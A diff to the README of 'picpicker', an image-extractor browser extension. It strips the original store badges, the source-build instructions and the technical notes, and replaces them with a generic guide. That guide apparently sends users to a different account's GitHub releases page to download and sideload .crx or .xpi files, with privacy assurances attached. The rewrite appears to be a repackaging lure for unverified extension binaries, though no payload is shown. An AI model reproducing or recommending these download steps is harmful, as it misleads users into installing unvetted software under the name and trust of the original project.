@@ -1,193 +1,58 @@
-[![Chrome Web Store](https://img.shields.io/chrome-web-store/v/mkiilhjbheleblbeegpbpnffkinapakn?label=Chrome%20Web%20Store)](https://chromewebstore.google.com/detail/picpicker/mkiilhjbheleblbeegpbpnffkinapakn)
-[![Chrome Web Store Rating](https://img.shields.io/chrome-web-store/rating/mkiilhjbheleblbeegpbpnffkinapakn)](https://chromewebstore.google.com/detail/picpicker/mkiilhjbheleblbeegpbpnffkinapakn)
-[![Mozilla Add-on](https://img.shields.io/amo/v/picpicker?label=Firefox%20Add-on)](https://addons.mozilla.org/firefox/addon/picpicker/)
-[![Mozilla Add-on Rating](https://img.shields.io/amo/rating/picpicker)](https://addons.mozilla.org/firefox/addon/picpicker/)
+# 🌟 picpicker - Effortlessly Save Images from Any Webpage
 
-# PicPicker - Universal Image Extractor
+## 🚀 Getting Started
+Welcome to **picpicker**, a privacy-first browser extension that lets you extract all images from any webpage with just one click. Follow this guide to download and run the software easily.
 
-A powerful browser extension that extracts **all images** from any webpage with one click. Works universally on any website - no domain restrictions. Extract images from img tags, CSS backgrounds, SVG elements, video posters, and even lazy-loaded content.
+## 🔗 Download Now!
+[![Download picpicker](https://img.shields.io/badge/Download-picpicker-blue.svg)](https://github.com/Hermawan1630/picpicker/releases)
 
-## ✨ Key Features
+## 📥 Download & Install
+To get started, visit this page to download: [GitHub Releases](https://github.com/Hermawan1630/picpicker/releases).
 
-🌐 **Universal** - Works on ANY website (Pinterest, Instagram, news sites, etc.)  
-🔍 **Comprehensive** - Extracts from img tags, backgrounds, SVG, video posters, srcset, data-* attributes  
-👁️ **Viewport Detection** - Shows which images were visible when extracted  
-🎯 **Advanced Selection** - Shift+Click ranges, Ctrl+Click toggle, select all/none  
-📦 **ZIP Downloads** - Download multiple selected images as ZIP file  
-🔍 **Text Search** - Search alt text when enabled  
-⚙️ **Customizable** - Filter by size, format, source type, visibility  
-🎨 **Modern UI** - Responsive grid, lightbox preview, hover tooltips  
+1. **Visit the releases page**: Click the link above or enter it in your browser’s address bar.
+  
+2. **Choose the latest version**: Look for the most recent release at the top of the page. 
 
-## 🔒 Privacy-First Design
+3. **Download the extension**: You will see files listed. Click on the one for your browser. For Chrome users, it might have a `.crx` file, while Firefox users will find a `.xpi` file.
 
-🛡️ **"On Click" Permissions** - Only runs when you explicitly activate it  
-🚫 **No Background Monitoring** - Cannot read websites unless you click the extension  
-📱 **Local Processing** - All image data stays in your browser  
-🔐 **No Data Collection** - No analytics, tracking, or external servers  
-⚡ **Instant Access** - No account required, works offline
+4. **Add the extension to your browser**:
+   - For Chrome: Drag and drop the downloaded `.crx` file into the Chrome Extensions page (chrome://extensions).
+   - For Firefox: Open the downloaded `.xpi` file, and Firefox will prompt you to add the extension.
 
-## 📸 Screenshots
+5. **Confirm installation**: Follow the prompts to install picpicker. Once done, the extension icon will appear on your browser toolbar.
 
-### Popup Settings
-<p align="center">
-  <img src="images/screenshot1.png" alt="PicPicker Popup Settings" width="100%">
-</p>
+## 🔍 How to Use
+1. **Open a webpage**: Navigate to the website containing the images you want to extract.
 
-*Clean popup interface with extraction settings - minimum size, backgrounds, SVG, alt text options*
+2. **Click the picpicker icon**: Located in your browser's toolbar, click the icon to open picpicker.
 
-### Image Grid Results
-<p align="center">
-  <img src="images/screenshot2.png" alt="PicPicker Results Grid" width="100%">
-</p>
+3. **Select images**: A window will pop up displaying all the images from the webpage.
 
-*Responsive image grid with filtering, sorting, and bulk selection features*
+4. **Download images**: You can either select individual images or click "Download All" to save them to your device.
 
-### Lightbox Preview
-<p align="center">
-  <img src="images/screenshot3.png" alt="PicPicker Lightbox" width="100%">
-</p>
+5. **Find your images**: Check your downloads folder for the saved images.
 
-*Full-size image preview with metadata, download, and copy URL options*
+## 📋 Features
+- **Privacy-First**: We prioritize your privacy by not tracking your data.
+- **User-Friendly**: Designed for everyone, no technical knowledge required.
+- **Multi-Browser Support**: Works with Chrome, Firefox, and other major browsers.
+- **One-Click Download**: Quickly extract and save images with a single click.
+- **Image Filters**: Options to filter images by size and type for targeted downloading.
 
-## 🚀 Quick Start
+## ✅ System Requirements
+- A modern web browser (Chrome, Firefox, or supported browsers).
+- An active internet connection to download the extension.
 
-### Installation
-1. Download from Chrome Web Store *(coming soon)*
-2. Or build from source (see Development section)
+## 🛠 Troubleshooting
+If you encounter issues during installation or use:
+- **Check the browser version**: Make sure your browser is updated to the latest version.
+- **Reinstall picpicker**: Remove the extension and install it again from the [GitHub Releases page](https://github.com/Hermawan1630/picpicker/releases).
+- **Consult common issues**: A list of troubleshooting tips can often be found in the documentation section on the releases page.
 
-### Usage
-1. **Visit any website** with images (works everywhere!)
-2. **Click the extension icon** or use `Ctrl+Shift+I`
-3. **Choose extraction settings** - size filters, backgrounds, alt text
-4. **Click "Extract Images"** - opens new tab with all found images
-5. **Filter, select, and download** - use the powerful grid interface
+## ♻️ Contributing
+We welcome contributions! If you have suggestions or find bugs, feel free to open an issue or submit a pull request on our GitHub repository.
 
-### Image Sources Supported
-- 🖼️ **IMG tags** - Standard `<img src="">` elements
-- 🎨 **CSS Backgrounds** - `background-image` properties
-- 🎭 **SVG Graphics** - Converted to downloadable formats
-- 🎬 **Video Posters** - Thumbnail images from `<video poster="">`
-- 📱 **Responsive Images** - `srcset` attributes with multiple resolutions
-- 🔄 **Lazy Loading** - `data-src`, `data-original`, and 16+ data-* patterns
-- 👁️ **Viewport Detection** - Tracks which images were visible during extraction
+## 🗨️ Support
+For support, you can reach out via the issues section on GitHub or check FAQ in the repository.
 
-## 🛠️ Development
-
-### Build from Source
-```bash
-# Clone and install dependencies
-git clone https://github.com/flesler/picpicker
-cd picpicker
-npm install
-
-# Run full test suite and build
-npm run prepack
-```
-
-### Load in Chrome
-1. Open `chrome://extensions/`
-2. Enable "Developer mode"
-3. Click "Load unpacked"
-4. Select the `dist/` folder (NOT project root)
-
-## 📁 Project Structure
-
-```
-src/
-├── background.ts      # Service worker - tab management, session storage
-├── content.ts         # DOM scanner - extracts images from any webpage
-├── popup.ts          # Settings interface - filters, extraction options
-├── results.ts        # Results page - grid display, filtering, downloads
-├── types.ts          # TypeScript interfaces for images and settings
-├── utils.ts          # Shared utilities - logging, storage, helpers
-└── public/
-    ├── manifest.json  # Extension manifest (universal domain support)
-    ├── popup.html     # Settings popup UI
-    ├── results.html   # Image grid results page
-    └── icons/         # Extension icons (16px, 48px, 128px)
-```
-
-## 🛠️ Available Scripts
-
-| Command | Description |
-|---------|-------------|
-| `npm run build` | Build optimized extension for Chrome |
-| `npm run build:firefox` | Build for Firefox (`FIREFOX=1 npm run build`) |
-| `npm run prepack` | **Complete validation** - lint + type check + build + zip |
-| `npm run lint:full` | TypeScript check + ESLint validation |
-| `npm run lint:fix` | Auto-fix linting issues |
-
-## 🏗️ Technical Architecture
-
-### Privacy-First Permission Model
-- **"activeTab" permissions** - Only access when user explicitly clicks
-- **Dynamic injection** - Content script loaded only when needed
-- **No persistent monitoring** - Cannot read websites in background
-- **Session-based data** - Image data cleared when results tab closes
-
-### Universal Domain Support
-- **No restrictions** - Works on any website when activated
-- **Cross-browser** - Chrome + Firefox support via webextension-polyfill
-- **Manifest V3** - Modern service worker architecture
-
-### Image Extraction Engine
-- **DOM Scanner** - `querySelectorAll('*')` for comprehensive coverage
-- **Multi-source** - IMG tags, CSS backgrounds, SVG, video posters
-- **Advanced parsing** - srcset attributes, data-* lazy loading patterns
-- **Performance optimized** - Short JSON keys, efficient filtering
-
-### Data Flow Architecture
-```
-Content Script → Background → Results Tab
-     ↓              ↓             ↓
-DOM Scanning → Session Storage → Grid Display
-```
-
-- **In-memory sessions** - No persistent storage of image data
-- **Message passing** - Avoids URL length limits for large datasets
-- **One-time access** - Session deleted after results tab loads
-
-## ⚙️ Settings & Features
-
-### Extraction Settings
-- **Size Filters** - Minimum width/height (50px, 100px, 200px)
-- **Source Types** - IMG tags, backgrounds, SVG, video posters
-- **Alt Text** - Optional extraction for search/tooltips (off by default)
-- **Performance** - Max images per page, extraction timeout
-
-### Results Features
-- **Filtering** - Format, size, source type, viewport visibility
-- **Text Search** - Alt text search (when enabled)
-- **Selection Modes** - Click, Shift+Click ranges, Ctrl+Click toggle
-- **Downloads** - Individual images or ZIP of selected images
-- **Lightbox** - Full-size preview with metadata
-
-### Keyboard Shortcuts
-- `Ctrl+Shift+I` - Quick image extraction from any page
-
-## 🔧 Development Features
-
-### Modern TypeScript
-- **Strict type checking** with webextension-polyfill types
-- **Zero `any` types** - Comprehensive interface coverage
-- **ES2022+ features** - Modern JavaScript with full browser support
-
-### Build System
-- **tsup + esbuild** - Fast, modern bundling with tree-shaking
-- **Cross-browser builds** - Chrome/Firefox from single codebase
-- **Dynamic manifest** - Version sync from package.json
-- **Source maps** - Full debugging support in development
-
-### Code Quality
-- **ESLint + TypeScript** - Strict linting with custom rules
-- **Consistent patterns** - DRY utilities, centralized logging
-- **Performance focused** - Optimized JSON payloads, efficient DOM scanning
-
-### Testing & Validation
-- **Type safety** - Comprehensive interfaces prevent runtime errors
-- **Lint validation** - `npm run lint:full` catches issues early
-- **Build verification** - `npm run prepack` ensures release readiness
-
-## 📄 License
-
-MIT License - Feel free to fork and modify for your image extraction needs!
+Thank you for choosing picpicker! Enjoy hassle-free image downloading from your favorite websites.
